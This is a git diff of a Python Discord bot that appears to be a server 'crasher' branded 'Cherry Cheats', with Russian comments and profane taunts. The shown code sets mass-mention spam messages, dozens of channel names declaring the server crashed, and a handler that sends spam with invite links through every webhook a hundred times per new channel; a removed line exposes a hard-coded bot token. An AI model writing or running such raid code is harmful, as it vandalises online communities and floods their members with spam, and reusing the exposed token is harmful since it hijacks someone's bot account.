@@ -1,3 +1,4 @@
+#импортируем библы
 import discord
 import os
 from discord.ext import commands
@@ -21,7 +22,7 @@ import discord, random, aiohttp, asyncio
 from threading import Thread
 
 bot = commands.Bot(command_prefix = '?')
-bot.remove_command = 'help'
+bot.remove_command = 'help' # удаляем встроенную команду Help
 
 SPAM_MESSAGE = ['Crashed by Cherry Cheats @everyone @here']
 SPAM_CHANNEL = ['crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats''crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats']
@@ -78,8 +79,8 @@ async def on_guild_channel_create(channel):
             for i in range(100):
                 hooks = await channel.webhooks()
                 for hook in hooks:
-                    await hook.send('''@everyone @here\n https://discord.gg/W7T4R6aMra''', embed=discord.Embed(title='''CherryCheats | Crashed''', description='''```diff\n+ Бу ебать!!! Сервак крашнут от CherryCheats! Попукать осками: https://discord.gg/arzVY7jkqr```''', colour = discord.Colour.from_rgb(255, 0, 0)))				
+                    await hook.send('''@everyone @here\n https://discord.gg/W7T4R6aMra''', embed=discord.Embed(title='''CherryCheats | Crashed''', description='''```diff\n+ Бу ебать!!! Сервак крашнут от CherryCheats! Попукать осками: https://discord.gg/arzVY7jkqr```''', colour = discord.Colour.from_rgb(123, 104, 238)))				
 
 
-token = 'OTY0NDgzNzA1OTMyNDg4NzA0.YllTcg.5E8XwqTiHvWDQ-7uI2Awo7QtYqs'
+token = 'token'
 bot.run(token)
